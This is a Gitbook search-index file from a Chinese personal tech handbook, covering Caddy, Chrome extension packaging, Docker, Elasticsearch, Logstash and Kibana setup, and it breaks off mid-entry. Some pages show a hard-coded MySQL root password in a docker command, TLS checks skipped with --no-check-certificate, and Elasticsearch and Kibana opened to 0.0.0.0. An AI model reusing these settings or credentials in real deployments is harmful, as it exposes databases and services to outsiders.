{"./":{"url":"./","title":"介绍","keywords":"","body":"介绍 这是一本记录所有技术实践的书，方便未来遇到问题是查看使用。 github发布页面 切换分支: git checkout -b gh-pages 将_book目录提交给分支gh-pages: git remote add -f 其中-f意思是在添加远程仓库之后，立即执行fetch git subtree add –prefix= –squash –squash意思是把subtree的改动合并成一次commit，这样就不用拉取子项目完整的历史记录。–prefix之后的=等号也可以用空格 用法 初始化(第一次使用): git clone git@github.com:zouhuigang/my-handbook.git git checkout -b gh-pages git remote add -f _book git@github.com:zouhuigang/my-handbook.git git add -A git commit -m \"my-hardbook init\" git subtree push --prefix=_book origin gh-pages 第二次： git checkout -b master (可直接在master上提交分支) git add -A git commit -m \"...\" git push origin master git subtree push --prefix=_book origin gh-pages 如果不能提交，则检查.gitignore文件里面，是不是有_book存在，如果存在，则注释掉。 支持本书 为贡献者加油！为云原生干杯&#x1F37B;！ 使用微信Or支付宝扫一扫请贡献者喝一杯☕️ Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-08-03 19:53:08 "},"caddy/caddy使用.html":{"url":"caddy/caddy使用.html","title":"caddy的安装和使用","keywords":"","body":"caddy的安装和使用 Quick Start 1.Download Caddy and put it in your PATH.(下载caddy并加入环境变量) 2.cd to your website's directory.(打开网站根目录) 3.Run caddy.(运行caddy) 安装 mkdir /caddy wget https://github.com/mholt/caddy/releases/download/v0.10.6/caddy_v0.10.6_linux_amd64.tar.gz tar zxvf caddy_v0.10.6_linux_amd64.tar.gz 加入环境变量 vi ~/.bash_profile 修改Path为： PATH=$PATH:$HOME/bin:/caddy source ~/.bash_profile 配置文件 mkdir /caddy-www && cd /caddy-www echo 'localhost:8888'>>Caddyfile #caddy -conf ../path/to/Caddyfile caddy 浏览器打开 ip:8888 https://github.com/Unknwon/wuwen.org/issues/12 https://github.com/Unknwon/wuwen.org/issues/11 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 17:19:14 "},"chrome/chrome浏览器扩展开发之Anooc Tool工具箱开发.html":{"url":"chrome/chrome浏览器扩展开发之Anooc Tool工具箱开发.html","title":"chrome浏览器扩展开发之Anooc Tool工具箱开发","keywords":"","body":"chrome浏览器扩展开发之Anooc Tool工具箱开发 manifest.json说明 { \"background\": { \"persistent\": true, \"scripts\": [\"js/background.js\"] }, \"content_scripts\": [ ], \"author\": \"作者\", \"browser_action\": { \"default_icon\": \"img/logo/icon48.png\", \"default_popup\": \"popup.html\" }, \"description\": \"Anooc tool\", \"icons\": { \"16\": \"img/logo/icon16.png\", \"48\": \"img/logo/icon48.png\", \"128\": \"img/logo/icon128.png\" }, \"manifest_version\": 2, \"name\": \"Anooc Tool\", \"permissions\": [ \"webRequest\", \"webRequestBlocking\", \"contextMenus\", \"http://*/*\", \"https://*/*\", \"\", \"tabs\", \"*://*/*\", \"clipboardWrite\", \"clipboardRead\"], \"update_url\": \"https://clients2.google.com/service/update2/crx\", \"version\": \"1.0.0\" } 查看源代码 anooc_tool_chrome 打包成crx文件 查看扩展程序存放的目录，在浏览器输入： chrome://version/ 显示： Chromium 67.0.3396.99 (正式版本) Built on Ubuntu , running on Ubuntu 18.04 （64 位） 修订版本 8ef023c8bf48f152812e2068fc21827bc5503917- 操作系统 Linux JavaScript V8 6.7.288.46 Flash （已停用） 用户代理 Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/67.0.3396.99 Chrome/67.0.3396.99 Safari/537.36 命令行 /usr/lib/chromium-browser/chromium-browser --enable-pinch --flag-switches-begin --flag-switches-end 可执行文件路径 /usr/lib/chromium-browser/chromium-browser 个人资料路径 /home/zhg/.config/chromium/Default 其中: /home/zhg/.config/chromium/Default/Extensions 即为扩展程序存放的目录。 zhg@zhg-ThinkPad-E450c:~/.config/chromium/Default/Extensions$ ls bcjindcccaagfpapjjmafapmmgkkhgoa nhdogjmejiglipccpnnnanhbledajbpd bfeoldjhjmapdnlgjeokfjmnkepcdaeh padekgcemlokbadohgkifijomclgjgif kjkjddcjojneaeeppobfolgojhohbpjn 这里的目录，就是扩展程序的ID号,可以在chrome://extensions/中查看。 打包: 在chrome://extensions/下，找到“打包扩展程序”，找到开发的扩展路径根目录，秘钥为空。 已创建以下文件： 扩展程序：/home/zhg/workspaces/anooc_tool_chrome.crx 密钥文件：/home/zhg/workspaces/anooc_tool_chrome.pem 请妥善保存您的密钥文件。您还需要使用该文件创建新版扩展程序。 使用crx文件 将anooc_tool_chrome.crx拖入到chrome浏览器中(最好访问chrome://extensions/)，即可安装。 查看扩展文档 http://open.chrome.360.cn/extension_dev/overview.html 问题汇总 Q： 在使用打包过程中，提示 指定扩展程序的私有密钥已存在。请重复使用该密钥，或者先删除它。 A： 查找crx: sudo find / -name *.crx 然后删除。 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 17:30:51 "},"docker/docker-compose/docker_compose的使用.html":{"url":"docker/docker-compose/docker_compose的使用.html","title":"Q1:","keywords":"","body":"Q1: 使用docker-compose报错: pkg_resources.DistributionNotFound: The 'docker-compose==1.7.1' distribution was not found and is required by the application A1: 先启动docker mysql docker run -d -e MYSQL_ROOT_PASSWORD=TYwy2016720 -v /mnt/gitcoding/docker-lnmp-redis/mysql/mysql.cnf:/etc/mysql/conf.d/mysql.cnf:ro -v /mnt/gitcoding/docker-lnmp-redis/site/mysqldata:/var/lib/mysql -p 3306:3306 registry.aliyuncs.com/zhg_docker_ali_r/mysql Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"dos/dos攻击.html":{"url":"dos/dos攻击.html","title":"开始学习dos攻击","keywords":"","body":"开始学习dos攻击 http://www.kangddos.com/686.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"elasticsearch/logstash-input-jdbc - new.html":{"url":"elasticsearch/logstash-input-jdbc - new.html","title":"同步mysql中的数据到es中","keywords":"","body":"同步mysql中的数据到es中 正确安装java环境 $ sudo su - # cd /opt # wget --no-cookies --no-check-certificate --header \"Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie\" \"http://download.oracle.com/otn-pub/java/jdk/8u144-b01/090f390dda5b47b9b721c7dfaa008135/jdk-8u144-linux-x64.tar.gz\" # tar xzf jdk-8u144-linux-x64.tar.gz # cd /opt/jdk1.8.0_144/ # alternatives --install /usr/bin/java java /opt/jdk1.8.0_144/bin/java 2 # alternatives --config java -- (choose the new one, #3) # alternatives --install /usr/bin/jar jar /opt/jdk1.8.0_144/bin/jar 2 # alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_144/bin/javac 2 # alternatives --set jar /opt/jdk1.8.0_144/bin/jar # alternatives --set javac /opt/jdk1.8.0_144/bin/javac # java -version -- it responds with this display java version \"1.8.0_144\" Java(TM) SE Runtime Environment (build 1.8.0_144-b01) Java HotSpot(TM) 64-Bit Server VM (build 25.144-b01, mixed mode) Add some more commands to setup up JAVA_HOME and PATH variables: # echo \"export JAVA_HOME=/opt/jdk1.8.0_144\" >> /etc/profile.d/myprofile.sh # echo \"export JRE_HOME=/opt/jdk1.8.0_144/jre\" >> /etc/profile.d/myprofile.sh # echo \"export PATH=$PATH:/opt/jdk1.8.0_111/bin:/usr/java/jdk1.8.0_144/jre/bin\" >> /etc/profile.d/myprofile.sh # chmod 755 /etc/profile.d/myprofile.sh # exit (to leave the \"root\" account) $ source /etc/profile.d/myprofile.sh $ echo $JAVA_HOME QA里面的目录是mkdir /usr/java 创建目录 mkdir -p /opt/logstash && cd /opt/logstash wget https://artifacts.elastic.co/downloads/logstash/logstash-5.2.1.tar.gz tar -zxvf logstash-5.2.1.tar.gz 安装 cd /opt/logstash/ bin/logstash-plugin install logstash-input-jdbc (这句会报错误,cannot install logstash-core-event-java-5.1.1-java) bin/logstash-plugin install --local logstash-input-jdbc (安装本地logstash-input-jdbc) 安装mysql-connector-java-5.1.43.zip 官网下载地址 https://dev.mysql.com/downloads/connector/j/ 下载mysql-connector-java-5.1.33.zip curl -o mysql-connector-java-5.1.33.zip -L 'http://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.33.zip/from/http://cdn.mysql.com/' （不能使用mysql-connector-java-5.1.33,会报错） cd /opt/logstash wget https://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.43.zip unzip mysql-connector-java-5.1.43.zip 使用 jdbc.config中指定上一部解压的位置,具体看配置文件 bin/logstash -f jdbc.config 参考文档： http://blog.csdn.net/fenglailea/article/details/56282414 https://javabirder.wordpress.com/2016/02/21/install-java-8-centos/ https://www.elastic.co/guide/en/logstash/current/offline-plugins.html https://discuss.elastic.co/t/how-to-install-logstash-plugin-in-off-line/68130/2 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"elasticsearch/logstash-input-jdbc.html":{"url":"elasticsearch/logstash-input-jdbc.html","title":"同步mysql数据到es中","keywords":"","body":"同步mysql数据到es中 环境Java 8 yum update mkdir /usr/java && cd /usr/java wget --no-cookies --no-check-certificate --header \"Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie\" \"http://download.oracle.com/otn-pub/java/jdk/8u144-b01/090f390dda5b47b9b721c7dfaa008135/jdk-8u144-linux-x64.tar.gz\" tar -xvf jdk-8u144-linux-x64.tar.gz cd /usr/java/jdk1.8.0_144/ alternatives --install /usr/bin/java java /usr/java/jdk1.8.0_144/bin/java 2 alternatives --config java -- (选择最新的一个3) alternatives --install /usr/bin/jar jar /usr/java/jdk1.8.0_144/bin/jar 2 alternatives --install /usr/bin/javac javac /usr/java/jdk1.8.0_144/bin/javac 2 alternatives --set jar /usr/java/jdk1.8.0_144/bin/jar alternatives --set javac /usr/java/jdk1.8.0_144/bin/javac java -version 环境变量: echo \"export JAVA_HOME=/usr/java/jdk1.8.0_144\" >> /etc/profile.d/myprofile.sh echo \"export JRE_HOME=/usr/java/jdk1.8.0_144/jre\" >> /etc/profile.d/myprofile.sh echo \"export PATH=$PATH:/usr/java/jdk1.8.0_111/bin:/usr/java/jdk1.8.0_144/jre/bin\" >> /etc/profile.d/myprofile.sh chmod 755 /etc/profile.d/myprofile.sh 退出 (to leave the \"root\" account) source /etc/profile.d/myprofile.sh echo $JAVA_HOME 或者 #jdk export JAVA_HOME=/usr/local/jdk1.8.0_111 export PATH=$JAVA_HOME/bin:$PATH export CLASSPATH=.:$JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar 立刻生效 source /etc/profile echo $JAVA_HOME 如果返回为空，则需要配置环境变量 logstash-input-jdbc插件是logstash 的一个个插件。 使用ruby语言开发 下载插件过程中最大的坑是下载插件相关的依赖的时候下不动，因为国内网络的原因，访问不到亚马逊的服务器。 解决办法，改成国内的ruby仓库镜像。此镜像托管于淘宝的阿里云服务器上 ,https://ruby.taobao.org/ yum install gem gem sources --add https://ruby.taobao.org/ --remove https://rubygems.org/ gem sources -l 说明： # 请确保只有 ruby.taobao.org 如果 还是显示 https://rubygems.org/ 进入 home的 .gemrc 文件 sudo vim ~/.gemrc 手动删除 https://rubygems.org/ 修改Gemfile的数据源地址 gem install bundler bundle config mirror.https://rubygems.org https://ruby.taobao.org ==其他软件，安装logstash,这个不是logstash-input-jdbc插件 cd /opt/logstash/ wget https://artifacts.elastic.co/downloads/logstash/logstash-5.2.1.tar.gz tar -zxvf logstash-5.2.1.tar.gz 测试是否安装成功 cd logstash-5.2.1 bin/logstash -e 'input { stdin { } } output { stdout {}}' 安装logstash-input-jdbc cd logstash-5.2.1 #bin/logstash-plugin install logstash-input-jdbc bin/logstash-plugin install --local logstash-input-jdbc 列出已安装插件 #bin/logstash-plugin list --verbose | grep elasticsearch bin/logstash-plugin list --verbose 使用,#这个包要在logstash服务器上存在包 首先为es安装mysql-connector插件,https://dev.mysql.com/downloads/connector/j/ cd /opt/logstash/ #curl -o mysql-connector-java-5.1.33.zip -L 'http://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.33.zip/from/http://cdn.mysql.com/' #unzip mysql-connector-java-5.1.33.zip wget https://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.43.zip unzip mysql-connector-java-5.1.43.zip bin/logstash -f jdbc.config 测试mysql-connector-java-5.1.33会提示报错，不能加载包，改成mysql-connector-java-5.1.43就好了 使用前先将jdbc.config上传到/opt/logstash/logstash-5.2.1目录下，在运行bin/logstash -f jdbc.config 问题汇总 Q1：An error occurred while installing logstash-core-event-java (5.2.1), and Bundler cannot continue. Make sure that gem install logstash-core-event-java -v '5.2.1' succeeds before bundling. A1：使用 bin/logstash-plugin install --local logstash-input-jdbc 参考文档： http://blog.csdn.net/yeyuma/article/details/50240595#quote http://blog.csdn.net/fenglailea/article/details/56282414 https://www.elastic.co/guide/en/logstash/current/plugins-inputs-jdbc.html http://www.jianshu.com/p/bcd3a2210177 https://www.digitalocean.com/community/tutorials/how-to-install-java-on-centos-and-fedora http://www.ruanyifeng.com/blog/2017/08/elasticsearch.html https://discuss.elastic.co/t/i-can-not-install-any-logstash-plug-in-in-es-5-0/64313/26 https://javabirder.wordpress.com/2016/02/21/install-java-8-centos/ https://www.elastic.co/guide/en/logstash/current/offline-plugins.html http://blog.csdn.net/laoyang360/article/details/51747266 http://itblog.rrslj.com/logstash-input-jdbc-tong-bu-yuan-li-ji-xiang-guan-wen-ti-jie-du/ http://www.cnblogs.com/licongyu/p/5383334.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"elasticsearch/readme-linux.html":{"url":"elasticsearch/readme-linux.html","title":"https://www.elastic.co/cn/","keywords":"","body":"https://www.elastic.co/cn/ 环境： yum install -y java 1.下载 cd ~ wget https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-5.5.1.tar.gz 解压： tar -zxvf elasticsearch-5.5.1.tar.gz 或者yum安装(推荐使用此方法安装） 1.添加源： $ sudo vi /etc/yum.repos.d/elasticsearch.repo [elasticsearch-5.x] name=Elasticsearch repository for 5.x packages baseurl=https://artifacts.elastic.co/packages/5.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md 2.yum安装 yum install elasticsearch -y systemctl daemon-reload systemctl enable elasticsearch.service 修改配置： vi /etc/elasticsearch/jvm.options 将 #-Xms2g #-Xmx2g 改为： -Xms1g -Xmx1g 外网访问: vi /etc/elasticsearch/elasticsearch.yml network.host: 0.0.0.0 3.启动 systemctl start elasticsearch.service 重启动： systemctl restart elasticsearch 4.访问 http://192.168.122.143:9200/ curl 127.0.0.1:9200 输出信息： { \"name\" : \"jjC8h3r\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"ROD_vAbIQjioGOZ5OEp_Fw\", \"version\" : { \"number\" : \"5.5.2\", \"build_hash\" : \"b2f0c09\", \"build_date\" : \"2017-08-14T12:33:14.154Z\", \"build_snapshot\" : false, \"lucene_version\" : \"6.6.0\" }, \"tagline\" : \"You Know, for Search\" } 关闭 curl -XPOST 'http://localhost:9200/_shutdown' 现在可以使用es啦~~~~同步mysql，请安装logstash-input-jdbc========= 配置elasticsearch cd elasticsearch-5.5.1/config/elasticsearch.yml vim elasticsearch.yml cluster.name: myes-1 设置数据目录权限 sudo mkdir -p /data/es-date/ chown -R elasticsearch:elasticsearch /data/es-date/#这个是我们存放数据的目录，手动创建 2.启动： cd elasticsearch-5.5.1/bin ./elasticsearch 或 sudo ./bin/elasticsearch ./bin/elasticsearch -d -Ecluster.name=my_cluster -Enode.name=node_1 或 ln -s /usr/local/elasticsearch-1.7.2 /usr/local/elasticsearch systemctl start elasticsearch 插件说明 Kibana:实现数据可视化。导览 Elastic Stack。 安装Kiabna： vi /etc/yum.repos.d/kibana.repo [kibana-5.x] name=Kibana repository for 5.x packages baseurl=https://artifacts.elastic.co/packages/5.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md 下载： yum -y install kibana 外网访问:/etc/kibana/kibana.yml server.host: \"0.0.0.0\" 启动： [root@localhost ~]# /bin/systemctl daemon-reload [root@localhost ~]# sudo systemctl enable kibana [root@localhost ~]# systemctl start kibana 测试： ip:5601 有界面就安装成功了 http://192.168.122.143:5601 X-Pack:是一个Elastic Stack的扩展，将安全，警报，监视，报告和图形功能包含在一个易于安装的软件包中。 安装，在Elasticsearch 的安装目录( /usr/share/elasticsearch/ )下运行: [root@localhost elasticsearch]# bin/elasticsearch-plugin install x-pack 安装过程中跳出选项选择y即可 如果你在Elasticsearch已禁用自动索引的创建， 在elasticsearch.yml配置action.auto_create_index允许X-pack创造以下指标： action.auto_create_index: .security,.monitoring*,.watches,.triggered_watches,.watcher-history* Kibana安装，在Kibana的安装目录( /usr/share/kibana/ )下运行，Kibana下载X-Pack [root@localhost kibana]# bin/kibana-plugin install x-pack Attempting to transfer from x-pack Attempting to transfer from https://artifacts.elastic.co/downloads/kibana-plugins/x-pack/x-pack-5.5.1.zip Transferring 119276972 bytes.................... Transfer complete Retrieving metadata from plugin archive Extracting plugin archive Extraction complete Optimizing and caching browser bundles... Plugin installation complete 安装过程有点长，慢慢等待成功安装....注意需要关闭ES服务器，如果已经启动的话，否则安装失败。 验证X-Pack 重新启动Elasticsearch和Kibana服务 然后访问http://localhost:9200/ 和 http://localhost:5601/ 此时需要输入用户名和密码登录，默认的用户名: elastic 密码: changeme systemctl restart elasticsearch systemctl restart kibana ES-head git clone git://github.com/mobz/elasticsearch-head.git cd elasticsearch-head npm install npm run start open http://192.168.122.143:9100/ 或者直接用docker docker run -p 9100:9100 registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/elasticsearch-head:5 或者使用谷歌的扩展： chrome-extension://ffmkiejjmecolpfloofpjologoblkegm/elasticsearch-head/index.html 如果没有npm命令，则安装 git clone https://github.com/cnpm/nvm.git cd nvm && source nvm.sh nvm list-remote #列出所有版本的node nvm install v8.4.0 健康检查 curl -u elastic http://127.0.0.1:9200/_cat/health 数据同步 logstash-input-jdbc 问题： Q1：OpenJDK 64-Bit Server VM warning: If the number of processors is expected to increase from one, then you should configure the number of parallel GC threads appropriately using -XX:ParallelGCThreads=N A1：将jvm.options改成 -Xms2g -Xmx2g -Xms256m -Xmx256m 参考文档： https://es.xiaoleilu.com/010_Intro/10_Installing_ES.html http://abcdocker.blog.51cto.com/11255059/1907687 http://blog.csdn.net/beitiandijun/article/details/56019960 http://qiita.com/tjinjin/items/7ea3ebd228748f9d5224 http://www.jianshu.com/p/e49ed6acd7da http://www.cnblogs.com/xing901022/p/5962722.html http://www.jianshu.com/p/eaf54202aa08 https://www.zghhome.cn/?p=350 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"elasticsearch/readme.html":{"url":"elasticsearch/readme.html","title":"安装java环境","keywords":"","body":"安装java环境 yum update mkdir /usr/java && cd /usr/java wget --no-cookies --no-check-certificate --header \"Cookie: gpw_e24=http%3A%2F%2Fwww.oracle.com%2F; oraclelicense=accept-securebackup-cookie\" \"http://download.oracle.com/otn-pub/java/jdk/8u152-b16/aa0333dd3019491ca4f6ddbe78cdb6d0/jdk-8u152-linux-x64.tar.gz\" #注，上面的地址如果找不到，可以在http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html中找最新的版本 tar -xvf jdk-8u152-linux-x64.tar.gz cd /usr/java/jdk1.8.0_152/ alternatives --install /usr/bin/java java /usr/java/jdk1.8.0_152/bin/java 2 alternatives --config java -- (选择最新的一个1) alternatives --install /usr/bin/jar jar /usr/java/jdk1.8.0_152/bin/jar 2 alternatives --install /usr/bin/javac javac /usr/java/jdk1.8.0_152/bin/javac 2 alternatives --set jar /usr/java/jdk1.8.0_152/bin/jar alternatives --set javac /usr/java/jdk1.8.0_152/bin/javac 查看版本: [root@k8s-master1 jdk1.8.0_152]# java -version java version \"1.8.0_152\" Java(TM) SE Runtime Environment (build 1.8.0_152-b16) Java HotSpot(TM) 64-Bit Server VM (build 25.152-b16, mixed mode) [root@k8s-master1 jdk1.8.0_152]# 添加环境变量: echo \"export JAVA_HOME=/usr/java/jdk1.8.0_152\" >> /etc/profile.d/myprofile.sh echo \"export JRE_HOME=/usr/java/jdk1.8.0_152/jre\" >> /etc/profile.d/myprofile.sh echo \"export PATH=$PATH:/usr/java/jdk1.8.0_152/bin:/usr/java/jdk1.8.0_152/jre/bin\" >> /etc/profile.d/myprofile.sh chmod 755 /etc/profile.d/myprofile.sh 退出 (to leave the \"root\" account) source /etc/profile.d/myprofile.sh 查看环境变量: echo $JAVA_HOME 如果返回为空，则需要配置环境变量 安装es 添加yum源 sudo vi /etc/yum.repos.d/elasticsearch.repo [elasticsearch-5.x] name=Elasticsearch repository for 5.x packages baseurl=https://artifacts.elastic.co/packages/5.x/yum gpgcheck=1 gpgkey=https://artifacts.elastic.co/GPG-KEY-elasticsearch enabled=1 autorefresh=1 type=rpm-md 注意前面不能有空格或tab,enter键 安装: yum install elasticsearch -y systemctl daemon-reload systemctl enable elasticsearch.service 修改配置: vi /etc/elasticsearch/jvm.options 将 #-Xms2g #-Xmx2g 改为： -Xms1g -Xmx1g 使外网可以访问: vi /etc/elasticsearch/elasticsearch.yml network.host: 0.0.0.0 启动: systemctl start elasticsearch.service 访问: http://ip:9200/ curl ip:9200 同步mysql数据库中的数据至es 安装logstash: mkdir -p /opt/logstash && cd /opt/logstash wget https://artifacts.elastic.co/downloads/logstash/logstash-5.2.1.tar.gz tar -zxvf logstash-5.2.1.tar.gz cd /opt/logstash/logstash-5.2.1 #bin/logstash-plugin install logstash-input-jdbc (这句会报错误,cannot install logstash-core-event-java-5.1.1-java) bin/logstash-plugin install --local logstash-input-jdbc (安装本地logstash-input-jdbc) 安装mysql-connector-java-5.1.43.zip: cd /opt/logstash wget https://dev.mysql.com/get/Downloads/Connector-J/mysql-connector-java-5.1.43.zip unzip mysql-connector-java-5.1.43.zip 使用: 将jdbc.config上传到/opt/logstash/logstash-5.2.1 然后: cd /opt/logstash/logstash-5.2.1 bin/logstash -f jdbc.config google浏览器可以使用elasticsearch-head插件，连接该es集群，方便查看数据。 jdbc.config例子: input { jdbc { jdbc_driver_library => \"/opt/logstash/mysql-connector-java-5.1.43/mysql-connector-java-5.1.43-bin.jar\" jdbc_driver_class => \"com.mysql.jdbc.Driver\" jdbc_connection_string => \"jdbc:mysql://{数据库ip地址}:3306/{数据库名称}?useUnicode=true&characterEncoding=utf-8\" jdbc_user => \"root\" jdbc_password => \"{数据库登录密码}\" schedule => \"* * * * *\" clean_run => false record_last_run => true last_run_metadata_path => \"/var/tmp/last_run_value.last\" use_column_value => true tracking_column => \"id\" tracking_column_type => \"numeric\" jdbc_paging_enabled => \"true\" jdbc_page_size => 500 jdbc_fetch_size => 500 statement => \"select * from anote where cateid=31 AND id>= :sql_last_value\" type => \"table_anote\" } } output { stdout { codec => json_lines } if[type] == \"table_anote\"{ elasticsearch { hosts => \"localhost:9200\" index => \"db_whateat\" document_type => \"%{type}\" # \"%{id}\" #防止数据重复 } } } 修改替换掉{}中的参数，例如: {数据库ip地址}=>127.0.0.1 {数据库名称}=>testDB Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"elasticsearch/readme_v1.0.0.html":{"url":"elasticsearch/readme_v1.0.0.html","title":"搜索引擎elasticsearch的安装","keywords":"","body":"搜索引擎elasticsearch的安装 windows下载地址 https://www.elastic.co/downloads/elasticsearch https://www.elastic.co/cn/downloads/elasticsearch#ga-release 解压缩在安装目录 环境：java环境，（https://www.java.com/zh_CN/） 在cmd命令行进入安装目录，再进入 bin目录，运行elasticsearch.bat命令： 启动成功后。在浏览器中输入:http://localhost:9200/ 返回： { \"name\" : \"7uzRCoL\", \"cluster_name\" : \"elasticsearch\", \"cluster_uuid\" : \"HhLG_cBgRG2DwaBzi9uwMA\", \"version\" : { \"number\" : \"5.5.1\", \"build_hash\" : \"19c13d0\", \"build_date\" : \"2017-07-18T20:44:24.823Z\", \"build_snapshot\" : false, \"lucene_version\" : \"6.6.0\" }, \"tagline\" : \"You Know, for Search\" } 页面上json里的 name 是节点的名字，集群名称是 elasticsearch，还有其他版本信息。 想停止的话，ctrl+c 单个 节点 可以作为一个运行中的 Elasticsearch 的实例。 而一个 集群 是一组拥有相同 cluster.name 的节点， 他们能一起工作并共享数据，还提供容错与可伸缩性。(当然，一个单独的节点也可以组成一个集群) 你可以在 elasticsearch.yml 配置文件中 修改 cluster.name ，该文件会在节点启动时加载 (这个重启服务后才会生效)。 安装插件： D:\\software\\elasticsearch-5.5.1\\bin>elasticsearch-plugin install mobz/elasticsearch-head elasticsearch-plugin install elastic/sense 问题： Q1:Could not reserve enough space for 2097152KB object heap A1: 因为jvm有内存使用配置。es默认的配置是2g。所以要修改为自己需要的。比如512m 搜索一下，找到修改的位置。 修改的位置，是在D:\\software\\elasticsearch-5.5.1\\config\\jvm.options 将： -Xms2g -Xmx2g 修改为 -Xms256m -Xmx256m 注意，配置文件中说明了initial size和 maximum size必须一致。 参考文档： http://www.cnblogs.com/CrazyAnts/p/5849726.html http://blog.csdn.net/ebw123/article/details/46707559 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"elasticsearch/中文分词插件.html":{"url":"elasticsearch/中文分词插件.html","title":"安装分词插件","keywords":"","body":"安装分词插件 首先，安装中文分词插件。这里使用的是 ik，也可以考虑其他插件（比如 smartcn）。 [root@k8s-master ~]# cd elasticsearch-5.5.1 root@k8s-master ~]# ./bin/elasticsearch-plugin install https://github.com/medcl/elasticsearch-analysis-ik/releases/download/v5.5.1/elasticsearch-analysis-ik-5.5.1.zip 上面代码安装的是5.5.1版的插件，与 Elastic 5.5.1 配合使用。 安装时报错，请根据elasticsearch的版本，下载对应版本的lk插件。 接着，重新启动 Elastic，就会自动加载这个新安装的插件。 systemctl restart elasticsearch 问题汇总： 1.如果出现中文保存，Invalid UTF-8 middle byte 在SecureCRT设置UTF8编码，右键->Properties->Appearance，字符编码设置为utf8 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"elasticsearch/使用.html":{"url":"elasticsearch/使用.html","title":"查看所有index:","keywords":"","body":"查看所有index: curl -X GET 'http://localhost:9200/_cat/indices?v' 新建index: curl -X PUT 'localhost:9200/weather' 服务器返回一个 JSON 对象，里面的acknowledged字段表示操作成功 删除index: curl -X DELETE 'localhost:9200/weather' 新建/index/type数据 curl -X PUT 'localhost:9200/accounts/person/1' -d ' { \"user\": \"张三\", \"title\": \"工程师\", \"desc\": \"数据库管理\" }' 如果你仔细看，会发现请求路径是/accounts/person/1，最后的1是该条记录的 Id。它不一定是数字，任意字符串（比如abc）都可以。 新增记录的时候，也可以不指定 Id，这时要改成 POST 请求。 curl -X POST 'localhost:9200/accounts/person' -d ' { \"user\": \"李四\", \"title\": \"工程师\", \"desc\": \"系统管理\" }' 查看具体信息 curl 'localhost:9200/accounts/person/1?pretty=true' 删除 curl -X DELETE 'localhost:9200/accounts/person/1' 更新 curl -X PUT 'localhost:9200/accounts/person/1' -d ' { \"user\" : \"张三\", \"title\" : \"工程师\", \"desc\" : \"数据库管理，软件开发\" }' 更新记录就是使用 PUT 请求，重新发送一次数据 数据查询 1.返回所有数据 curl 'localhost:9200/accounts/person/_search?pretty=true' 2.关键字搜索 curl 'localhost:9200/accounts/person/_search' -d ' { \"query\" : { \"match\" : { \"desc\" : \"软件\" }} }' 3.一次返回4条数据(默认10条) curl 'localhost:9200/accounts/person/_search' -d ' { \"query\" : { \"match\" : { \"desc\" : \"管理\" }}, \"size\": 4 }' 4.form字段指定位移(默认是从位置0开始) curl 'localhost:9200/accounts/person/_search' -d ' { \"query\" : { \"match\" : { \"desc\" : \"管理\" }}, \"from\": 1, \"size\": 1 }' 5.逻辑运算 curl 'localhost:9200/accounts/person/_search' -d ' { \"query\" : { \"match\" : { \"desc\" : \"软件 系统\" }} }' 上面代码搜索的是软件 or 系统。 如果要执行多个关键词的and搜索，必须使用布尔查询。 curl 'localhost:9200/accounts/person/_search' -d ' { \"query\": { \"bool\": { \"must\": [ { \"match\": { \"desc\": \"软件\" } }, { \"match\": { \"desc\": \"系统\" } } ] } } }' http://www.ruanyifeng.com/blog/2017/08/elasticsearch.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"elasticsearch/全量更新和增量更新.html":{"url":"elasticsearch/全量更新和增量更新.html","title":"全量更新和增量更新问题","keywords":"","body":"全量更新和增量更新问题 操作指导 #删除数据库，即es中的index curl -X DELETE 'localhost:9200/db_whateat' #运行全量配置文件 [root@k8s-master logstash-5.2.1]# bin/logstash -f jdbc-g.config 全量更新 全量更新，第一次导入mysql数据时使用,可能会有数据重复的问题，在每个output里面指定document_id就行啦 #document_id => \"%{[@metadata][_id]}\" #防止数据重复 document_id => \"%{goodsid}\" 具体看配置文件jdbc-g.config 增量更新 参考文档： https://elasticsearch.cn/question/720 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"erlang/er01.html":{"url":"erlang/er01.html","title":"安装","keywords":"","body":"＃＃＃　　安装 apt-get install erlang erl Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"front/grun.html":{"url":"front/grun.html","title":"打开项目目录：","keywords":"","body":"打开项目目录： cd D:\\www\\yiyang\\static 安装 CLI npm 